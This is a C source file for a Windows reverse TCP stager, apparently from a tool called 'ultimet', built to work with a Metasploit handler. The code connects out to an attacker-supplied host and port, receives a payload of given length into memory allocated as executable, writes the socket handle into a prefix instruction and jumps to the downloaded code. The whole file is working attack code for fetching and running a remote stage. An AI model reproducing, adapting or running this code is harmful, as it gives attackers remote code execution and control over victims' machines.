#include "main.h"
/*
Steps are as follows:
1- Initialize winsock
2- Connect to lhost:lport
3- Return socket on success, INVALID_SOCKET otherwise...
*/

SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.com/en-us/library/windows/desktop/ms737591(v=vs.85).aspx
{
	WSADATA wsaData;
	SOCKET SocketToHandler = INVALID_SOCKET;
	char ansiIP[1024] = {0};
	char ansiPort[128] = {0};

	UnicodeToAnsi(ansiIP,IP);//I do not know why this works for me without problems, but when using wcstombs instead, ultimet stops responding w/error after KILLING THE SESSION FROM THE HANDLER SIDE...
	UnicodeToAnsi(ansiPort,iPort);
	//wcstombs(ansiIP,IP,wcslen(IP));
	//wcstombs(ansiPort,iPort,wcslen(iPort));

	struct addrinfo *result = NULL;	// A pointer to a linked list of addrinfo structures that contains response information about the host.
	struct addrinfo hints = {0};	// A pointer to an addrinfo structure that provides hints about the type of socket the caller supports. `getaddrinfo()`

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0)
	{
		printf("WSAStartup failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Resolve the handler address and port
	hints.ai_family = AF_INET;		// fill the hints structure 
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(ansiIP, ansiPort, &hints, &result);
	if ( iResult != 0 ) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Create a SOCKET for connecting to server
	SocketToHandler = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (SocketToHandler == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to handler
	iResult = connect( SocketToHandler, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(SocketToHandler);
		return INVALID_SOCKET;
	}
	return SocketToHandler;
} 


void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
{
	SOCKET sckt;
	int len = 0;
	char* buff;
	int count = 0;

	sckt = get_socket(IP, iPort); // connect
	if (sckt == INVALID_SOCKET) //Couldn't connect
	{
		dprintf(L"[-] Failed to connect ... will exit!\n");
		exit(1);
	}
	dprintf(L"[+] Socket: %d\n", sckt);

	dprintf(L"[*] Connecting \"%s:%s\"\n", IP, iPort);

	count = recv(sckt, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
	if (count != 4 || len <= 0) 
	{
		dprintf(L"[-] We connected, but something went wrong while receiving stage size ... will exit!\n");			
		exit(1);
	}

	dprintf(L"[*] Stage length = \"%d\" bytes.\n", len);
	buff = (char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE) ; //allocate
	if (buff == NULL)
	{
		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
		exit(1);
	}

	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", (len + 5));
	// Getting the stage
	recv(sckt, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
	dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
	buff[0] = 0xBF;
	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
	memcpy(buff+1, &sckt, 4);
	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
	(*(void (*)())buff)();//Bye bye ...
}
